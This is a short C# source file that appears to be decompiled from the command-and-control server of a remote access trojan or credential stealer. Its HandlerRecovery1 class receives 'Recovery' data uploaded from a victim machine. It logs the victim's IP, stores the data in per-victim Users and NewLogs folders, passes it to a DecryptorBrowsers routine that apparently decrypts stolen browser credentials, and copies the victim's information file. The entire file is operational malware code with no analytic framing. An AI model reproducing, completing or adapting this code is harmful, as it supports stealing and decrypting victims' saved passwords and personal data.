using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRecovery1
{
	public static void Read(Clients clients, object[] array)
	{
		Methods.AppendLogs(clients.IP, "Save logs in: Users\\" + array[1]?.ToString() + "\\Recovery", Color.MediumPurple);
		DynamicFiles.Save("Users\\" + array[1]?.ToString() + "\\Recovery", (object[])array[2]);
		DynamicFiles.Save("NewLogs\\" + array[1], (object[])array[2]);
		DecryptorBrowsers.Start("Users\\" + array[1]?.ToString() + "\\Recovery");
		DecryptorBrowsers.Start("NewLogs\\" + array[1]);
		File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "NewLogs\\" + (array[1] as string) + "\\InformationLeb.txt");
		File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "Users\\" + (array[1] as string) + "\\Recovery\\InformationLeb.txt");
		clients.Disconnect();
	}
}
